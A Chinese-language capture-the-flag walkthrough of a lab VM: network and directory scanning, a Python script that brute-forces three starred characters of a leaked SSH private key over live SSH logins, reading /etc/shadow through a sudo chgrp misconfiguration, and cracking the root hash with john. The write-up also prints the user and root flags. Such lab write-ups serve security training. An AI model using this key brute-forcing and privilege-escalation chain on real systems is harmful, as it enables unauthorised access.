# 信息搜集
主机发现

```clike
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 02:37 EDT
Nmap scan report for 192.168.21.1 (192.168.21.1)
Host is up (0.0071s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.2 (192.168.21.2)
Host is up (0.00016s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.3 (192.168.21.3)
Host is up (0.040s latency).
MAC Address: 72:10:25:EC:4F:8C (Unknown)
Nmap scan report for 192.168.21.6 (192.168.21.6)
Host is up (0.017s latency).
MAC Address: C2:AB:39:9E:98:94 (Unknown)
Nmap scan report for 192.168.21.15 (192.168.21.15)
Host is up (0.00020s latency).
MAC Address: 08:00:27:E3:04:FC (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.11 (192.168.21.11)
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.25 seconds
```
端口扫描

```clike
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 02:38 EDT
Nmap scan report for 192.168.21.15 (192.168.21.15)
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E3:04:FC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80 192.168.21.15  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 02:38 EDT
Nmap scan report for 192.168.21.15 (192.168.21.15)
Host is up (0.00028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
MAC Address: 08:00:27:E3:04:FC (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds
```

# 漏洞利用
看一下80端口

```clike
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.15   
<!DOCTYPE html>
<html>
    <head>
        <title>Cours PHP & MySQL</title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="cours.css">
    </head>
    
    <body>
        <h1>Under construction...</h1>
                <p>but not empty</p>
    </body>
</html>
```
目录扫描

```clike
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.15 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,git,zip 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,git,zip,html,txt,php,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 279]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/sshnote.txt          (Status: 200) [Size: 117]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 278]
Progress: 7759685 / 9482040 (81.84%)[ERROR] Get "http://192.168.21.15/3060000000056424.git": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```
/sshnote.txt

```clike
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.15/sshnote.txt
My RSA key is messed up, it looks like 3 capital letters have been replaced by stars.
Can you try to fix it?

sophie          
```
在cookie里找到了一段编码

![输入图片说明](image/46ceeec70adf4d1884765b5fe53546d7.png)

![输入图片说明](image/2ffa4b263a6348bcb343ca7c687b6a0e.png)

/poisonedgift.txt

```clike
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsruS5/Cd7clZ+SJJj0cvBPtTb9mfFvoO/FDtQ1i8ft3IZC9tHsKP
ut0abGtFGId9R0OB1ONB+iOMK5QNpoCXda3RDXJQ9oRCWjd2DxqRAyvdThhxq6wYJSATpa
l7M9UemrK/aDuZTAqLUSA9Zvpx474TiWXBMjdGqN2K/+SCf/DqIyknDLDRexe0Lc0IsNCV
/O39j4XJprHXMQZNaiokSuzV3VlXAYYBcTIK2Id/EMerpQdiNjMGvVIuBxfbF9/MGhEnR+
1fxxPTHZnKw5snlb47ynWtahCuZVVQr0b+c5z6MXVSJKP8LY0m8clQqUCwbPbCJnRJRCwh
TJY/xz0cu4H+Lbtx38iUv6NjiPXsvd/0FPjmNWrIwA3m4yYQL1dmSCX7JZAqYV5axI8box
Z4oHJP5dHADWdzic2XSqDSpIMxnDhlLh02ksCfNbkNkqbsiw/AO6IxnToPLH7jVjoYxnmA
y97klEGvt2UqIugfUV1p6j1sybTcM59ZUbo16i47AAAFiNnGZRvZxmUbAAAAB3NzaC1yc2
EAAAGBALK7kufwne3JWfkiSY9HLwT7U2/Znxb6DvxQ7UNYvH7dyGQvbR7Cj7rdGmxrRRiH
fUdDgdTjQfojjCuUDaaAl3Wt0Q1yUPaEQlo3dg8akQMr3U4YcausGCUgE6WpezPVHpqyv2
g7mUwKi1EgPWb6ceO+E4llwTI3Rqjdiv/kgn/w6iMpJwyw0XsXtC3NCLDQlfzt/Y+Fyaax
1zEGTWoqJErs1d1ZVwGGAXEyCtiHfxDHq6UHYjYzBr1SLgcX2xffzBoRJ0ftX8cT0x2Zys
ObJ5W+O8p1rWoQrmVVUK9G/nOc+jF1UiSj/C2NJvHJUKlAsGz2wiZ0SUQsIUyWP8c9HLuB
/i27cd/IlL+jY4j17L3f9BT45jVqyMAN5uMmEC9XZkgl+yWQKmFeWsSPG6MWeKByT+XRwA
1nc4nNl0qg0qSDMZw4ZS4dNpLAnzW5DZKm7IsPwDuiMZ06Dyx+41Y6GMZ5gMve5JRBr7dl
KiLoH1Fdaeo9bMm03DOfWVG6NeouOwAAAAMBAAEAAAGBAICL9cGJRhzCZ0qOhXdeDAw6Mi
1MyGX/HQ4Nqkd4p8FbA4hCr+mipzsPULTPhdd5gvnhLJyPgmFEdcjV5+drrwM9KxDPujlC
sHIwV2HPiqJMRxOm8wI0eP0ij97jATArRKKgkpeF3eBZ6Q9E78SDtavFhkmYfJYAOXq0NA
eNMuqPu+Xj8CjpdxBf4P/b6jc5HdbW2DoEUB7q40loLf+AJbAZnEthuPjoh1sBUdmfwhyw
btv3boRquJsrYt1JJ***qguwyDSLtXj4Wuxa7jZcLLSAuTHS+zWKwZA/8J1IpZAZhgkVXJ
fC8ZbG0M63VEQjuGXCuIY3cq1iQuXERhhbRuJ1XZT8Hki5YBaU/f5Wp7bId25Aps4ktljU
r67S9mwwppQ8dVmP6CsENgc3ivpWCDWC4PZojTgZ4qhWMpjCaUxe1Hi7GuvlRJNLL4A7Fx
kTV9nBcLlGfqzvVUPeEAZgXz4IxCx8KdTrDr/oXWw4hjqtuyRKveMjmKQ6HADFl7SMCQAA
AMBz8rqB0Mfb4U34LeA1kdZLFsGX3AZqahTDjEcZYAPI/A5Dt5iw0LcGRgrHuPccS5fA3E
GT2FceoMX2ccE5fEVydxcj2vcnPIQ01P6fxjVXpA7QDnJ2At2LLPcD9CuuSt/HCrp/Bmjv
IUFvjSgKl5nYGPfoeitIdFdM72liQ+0814iNzxNl5WuNeiJ+XAGuXqJT02gAxMRQPiJ67e
sMzJyVvM69B0kGkyAXTO9fcfq+X2JaCz3hId6Iwr68Mxe/L6MAAADBAOEpkHeU8xn5MHwG
79vpd6Cg7p1UqfDuvMOgvZe6eIOE3FIb1nWpCqjq9P0Myv8aCWYhwgKr3SNIWkZ1u+0NR9
43cZO7FWa4/DvI5gX6dlrcGy1BVoDuMWIWDw9bgXpQiGQSkQOQ3J/RPWH/xT5LQbrBVTK8
C8r4lrWDwWLMgk1Wbef6U0NBuY1+J4Hafsz2Psei3yFsjjA3djonb8JF+RnHRoO8TeJlj4
RjbkXTlhsGkdR77PNZmkZ2KVwn2VzsPwAAAMEAyzYixNTrJ4vPtjUluq7+O9qGwqpbl3i0
9ESSrC2NzbsA2afNjCWhfaLPpfNYR2gA1aQUgdRxNSM78P+plFhMUeGwTIsLsKEkbbtSqF
nUU/g3yNGFr4Die7AB0vZSHwWaQFMf+ZfXNwVRa0jmKfUc/itXgwxi3oqtWTJA7YKmXdrD
03EN/DboyflPcbmTJ4D6E6XqTeyfGamr0w5aelqqwTh/Mm+DuoHHiPMYThUMrG4iUvSRaz
ZgGQTtZoQRxi8FAAAADXNvcGhpZUBkZWJpYW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
同上一个所说，有三个被替换为了*
用脚本试一下
```clike
┌──(kali㉿kali)-[~]
└─$ python 1.py
开始暴力破解，共 46656 种组合...
进度: 1800/46656 (3.9%)
✅ 找到正确密钥！替换部分: BOM
```

```clike
import subprocess
import itertools
import string
import os

# 配置区（使用前必须修改！）
IP = "目标服务器IP"          # 替换为实际IP
USERNAME = "sophie"         # SSH用户名
KEY_FILE = "broken_key.txt" # 损坏的私钥文件路径
TIMEOUT = 3                 # SSH连接超时（秒）

def test_key(replacement):
    """测试密钥是否有效"""
    try:
        # 1. 生成临时密钥文件
        with open(KEY_FILE) as f:
            fixed_key = f.read().replace("***", replacement)
        
        with open("tmp_key", "w") as f:
            f.write(fixed_key)
        os.chmod("tmp_key", 0o600)  # 必须设置权限

        # 2. 快速本地验证
        keygen = subprocess.run(
            ["ssh-keygen", "-y", "-f", "tmp_key"],
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE,
            timeout=2
        )
        if keygen.returncode != 0:
            return False

        # 3. 真实SSH连接测试
        ssh = subprocess.run(
            f"ssh -i tmp_key -o StrictHostKeyChecking=no -o ConnectTimeout={TIMEOUT} {USERNAME}@{IP} echo '成功'",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=TIMEOUT
        )
        return ssh.returncode == 0

    except Exception as e:
        print(f"测试 {replacement} 时出错: {str(e)}")
        return False
    finally:
        if os.path.exists("tmp_key"):
            os.remove("tmp_key")  # 清理临时文件

def main():
    # 所有可能的3位组合（大写字母+数字）
    chars = string.ascii_uppercase + string.digits
    total = len(chars) ** 3
    print(f"开始暴力破解，共 {total} 种组合...")

    for i, combo in enumerate(itertools.product(chars, repeat=3)):
        replacement = "".join(combo)
        if test_key(replacement):
            print(f"\n✅ 找到正确密钥！替换部分: {replacement}")
            print(f"完整密钥已写入: fixed_key_{replacement}")
            with open(KEY_FILE) as f, open(f"fixed_key_{replacement}", "w") as out:
                out.write(f.read().replace("***", replacement))
            return

        # 进度显示（每尝试100次打印一次）
        if i % 100 == 0:
            print(f"\r进度: {i}/{total} ({i/total:.1%})", end="", flush=True)

    print("\n❌ 未找到有效密钥，请检查输入条件")

if __name__ == "__main__":
    main()
```
登陆成功

```clike
┌──(kali㉿kali)-[~]
└─$ ssh sophie@192.168.21.15 -i fixed_key_BOM 
Linux debian 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 17 13:39:16 2021 from 192.168.0.28
sophie@debian:~$
```

# 提权
user.txt

```clike
sophie@debian:~$ ls -la
total 32
drwx------ 4 sophie sophie 4096 Oct 17  2021 .
drwxr-xr-x 3 root   root   4096 Oct 17  2021 ..
lrwxrwxrwx 1 root   root      9 Oct 17  2021 .bash_history -> /dev/null                                                         
-rw-r--r-- 1 sophie sophie  220 Oct 17  2021 .bash_logout
-rw-r--r-- 1 sophie sophie 3526 Oct 17  2021 .bashrc
drwxr-xr-x 3 sophie sophie 4096 Oct 17  2021 .local
-rw-r--r-- 1 sophie sophie  807 Oct 17  2021 .profile
drwx------ 2 sophie sophie 4096 Oct 17  2021 .ssh
-rwx------ 1 sophie sophie   33 Oct 17  2021 user.txt
sophie@debian:~$ cat user.txt
a99ac9055a3e60a8166cdfd746511852
```
看一下有没有可以利用的

```clike
sophie@debian:~$ sudo -l
Matching Defaults entries for sophie on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophie may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/chgrp
sophie@debian:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/su
sophie@debian:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
sophie@debian:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
sophie:x:1001:1001:,,,:/home/sophie:/bin/bash
```

![输入图片说明](image/cfa5937c2ede4cd781aeca6a3ec9a162.png)

```clike
sophie@debian:~$ sudo /usr/bin/chgrp sophie /etc/shadow
sophie@debian:~$ cat /etc/shadow
root:$1$root$dZ6JC474uVpAeG8g0oh/7.:18917:0:99999:7:::
daemon:*:18916:0:99999:7:::
bin:*:18916:0:99999:7:::
sys:*:18916:0:99999:7:::
sync:*:18916:0:99999:7:::
games:*:18916:0:99999:7:::
man:*:18916:0:99999:7:::
lp:*:18916:0:99999:7:::
mail:*:18916:0:99999:7:::
news:*:18916:0:99999:7:::
uucp:*:18916:0:99999:7:::
proxy:*:18916:0:99999:7:::
www-data:*:18916:0:99999:7:::
backup:*:18916:0:99999:7:::
list:*:18916:0:99999:7:::
irc:*:18916:0:99999:7:::
gnats:*:18916:0:99999:7:::
nobody:*:18916:0:99999:7:::
_apt:*:18916:0:99999:7:::
systemd-timesync:*:18916:0:99999:7:::
systemd-network:*:18916:0:99999:7:::
systemd-resolve:*:18916:0:99999:7:::
messagebus:*:18916:0:99999:7:::
sshd:*:18916:0:99999:7:::
systemd-coredump:!*:18916::::::
mysql:!:18917:0:99999:7:::
sophie:$y$j9T$mD6gcz0.6rC4ZwGpDem3o0$HzDd6YXLy3Dsht17WVVX7v7ReGcJ9PXhG/B3bx4Nz/C:18917:0:99999:7:::
```
把root信息复制到文件里，然后爆破一下

```clike
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
barbarita        (root)     
1g 0:00:00:00 DONE (2025-03-31 03:54) 7.142g/s 204342p/s 204342c/s 204342C/s camera1..011293
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
root.txt

```clike
root@debian:/home/sophie# cd ~
root@debian:~# ls -la
total 40
drwx------  4 root root 4096 Oct 17  2021 .
drwxr-xr-x 18 root root 4096 Oct 16  2021 ..
lrwxrwxrwx  1 root root    9 Oct 17  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct 16  2021 .local
-rw-------  1 root root 6569 Oct 17  2021 .mysql_history
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rwx------  1 root root   33 Oct 17  2021 root.txt
drwx------  2 root root 4096 Oct 17  2021 .ssh
-rw-r--r--  1 root root  180 Oct 17  2021 .wget-hsts
root@debian:~# cat root.txt
bf3b0ba0d7ebf3a1bf6f2c452510aea2
```
